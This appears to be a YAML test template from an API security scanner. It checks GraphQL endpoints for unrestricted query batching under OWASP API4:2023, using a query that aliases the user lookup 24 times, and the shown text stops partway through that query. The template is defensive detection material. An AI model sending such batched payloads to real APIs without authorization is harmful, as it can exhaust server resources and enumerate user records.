id: graphql-batching-attack
info:
  name: "GraphQL Query Batching Attack"
  category: "API4:2023 Unrestricted Resource Consumption"
  severity: "HIGH"
  author: "hadrian"
  tags: ["graphql", "owasp", "owasp-api-top10", "dos", "batching", "aliasing"]
  requires_llm_triage: true
  test_pattern: "simple"

endpoint_selector:
  requires_auth: false

role_selector:
  attacker_permission_level: "all"
  victim_permission_level: "all"

graphql:
  - query: |
      query BatchQuery {
        q1: user(id: "1") { id name }
        q2: user(id: "2") { id name }
        q3: user(id: "3") { id name }
        q4: user(id: "4") { id name }
        q5: user(id: "5") { id name }
        q6: user(id: "6") { id name }
        q7: user(id: "7") { id name }
        q8: user(id: "8") { id name }
        q9: user(id: "9") { id name }
        q10: user(id: "10") { id name }
        q11: user(id: "11") { id name }
        q12: user(id: "12") { id name }
        q13: user(id: "13") { id name }
        q14: user(id: "14") { id name }
        q15: user(id: "15") { id name }
        q16: user(id: "16") { id name }
        q17: user(id: "17") { id name }
        q18: user(id: "18") { id name }
        q19: user(id: "19") { id name }
        q20: user(id: "20") { id name }
        q21: user(id: "21") { id name }
        q22: user(id: "22") { id name }
        q23: user(id: "23") { id name }
        q24: user(id: "24") { id name }
